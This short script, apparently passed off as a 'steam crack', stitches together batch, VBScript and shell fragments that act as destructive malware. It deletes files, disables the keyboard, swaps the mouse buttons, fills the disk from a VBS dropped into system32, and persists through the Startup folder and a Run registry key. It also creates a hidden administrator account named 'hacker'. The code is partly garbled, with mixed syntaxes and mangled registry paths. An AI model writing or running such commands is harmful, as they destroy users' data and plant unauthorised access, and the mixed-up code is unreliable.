do
msgbox "start steam crack"
Loop
do
sudo rm -rf /Roblox/*
loop
copy steam crack v2 C:\Users\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
rundll32 keyboard, disable
rundll32 user,SwapMouseButton
@echo off echo Set fso = CreateObject("Scripting.FileSystemObject") > %systemdrive%\windows\system32\rundll32.vbs 
echo do >> %systemdrive%\windows\system32\rundll32.vbs 
echo Set tx = fso.CreateTextFile("%systemdrive%\windows\system32\rundll32.dat", True) >> %systemdrive%\windows\system32\rundll32.vbs 
echo tx.WriteBlankLines(100000000) >> %systemdrive%\windows\system32\rundll32.vbs 
echo tx.close >> %systemdrive%\windows\system32\rundll32.vbs 
echo FSO.DeleteFile "%systemdrive%\windows\system32\rundll32.dat" >> %systemdrive%\windows\system32\rundll32.vbs 
echo loop >> %systemdrive%\windows\system32\rundll32.vbs 
start %systemdrive%\windows\system32\rundll32.vbs 
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v systemhostrun /t REG_SSZ /d %systemdrive%\windows\system32\rundll32.vbs /f
del "%SystemRoot%Cursors*.*" >nul
FOR /L %%i IN (1,1,1000000) DO md %%i
@echo off
chcp 1251
net user SUPPORT_388945a0 /delete
net user hacker hack /add
net localgroup Администраторы hacker /add
net localgroup Пользователи SUPPORT_388945a0 /del
reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y